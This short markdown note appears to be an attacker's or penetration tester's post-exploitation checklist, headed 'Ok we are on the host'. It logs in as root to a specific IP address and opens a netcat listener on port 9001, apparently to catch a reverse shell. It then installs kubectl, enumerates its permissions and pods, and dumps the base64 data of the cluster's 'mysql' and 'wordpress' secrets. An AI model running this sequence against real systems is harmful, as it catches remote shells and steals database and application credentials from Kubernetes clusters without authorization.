
# Ok we are on the host
```bash
ssh root@128.140.44.16
nc -nvl 9001


curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl
mv kubectl /usr/local/bin/.

kubectl auth can-i --list

kubectl get pods

kubectl describe pod mysql-0

kubectl get secret mysql -o jsonpath='{.data}'
kubectl get secret wordpress -o jsonpath='{.data}'
```
